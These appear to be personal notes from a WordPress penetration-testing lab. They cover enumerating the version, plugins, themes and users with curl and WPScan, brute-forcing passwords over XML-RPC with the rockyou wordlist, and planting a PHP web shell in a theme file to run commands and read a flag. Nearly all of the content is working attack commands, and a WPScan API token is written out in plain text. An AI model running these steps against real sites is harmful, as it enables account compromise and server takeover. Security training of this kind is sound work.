# Enumeration
```
Version:
 curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'

Plugins:
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

Themes:
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

Navigate to plugin or theme page and enumerate if directory indexing is enabled.


```


# Enumerate Users
```
Authors have an ID number that can be fuzzed:
curl -I http://94.237.58.95:32352/?author=3

Enumerate method calls:

curl -X POST -d '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' http://94.237.58.95:32352/xmlrpc.php | grep '<value><string'

If the following are allowed method calls then bruteforcing is possible:
wp.getUserBlogs  
wp.getCategories  
metaWeblog.getUsersBlogs

```


# WPSCAN
```
Get api token at (https://wpscan.com/)

Eumerate using WPScan:
wpscan --url http://94.237.49.101:47515/ --enumerate ap --api-token eSA8H7z2EGJSgZFwekZIa7XEw9QTeS8pJ5yqGsRO67Y -t 10

--enumerate ap : Find all plugins
*To find vulnerabilities use: searchsploit <name of plugin>*

--enumerate at : Find all themes
--enumerate u : Find users ID 1-10
-t : Threads

Wordpress bruteforcing:
wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://94.237.49.101:47515/

```


# RCE in WordPress

```
1. Go to theme editor and choose an unused theme.
2. Add the following line to one of the files of the theme:
   system($_GET['cmd']);
3. Save the file and navigate to the page or use curl to call commands.
curl -s http://94.237.49.101:47515/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/wp-user/flag.txt

** 404.php is the page I added the web shell to adn twentyseventeen is the theme.
```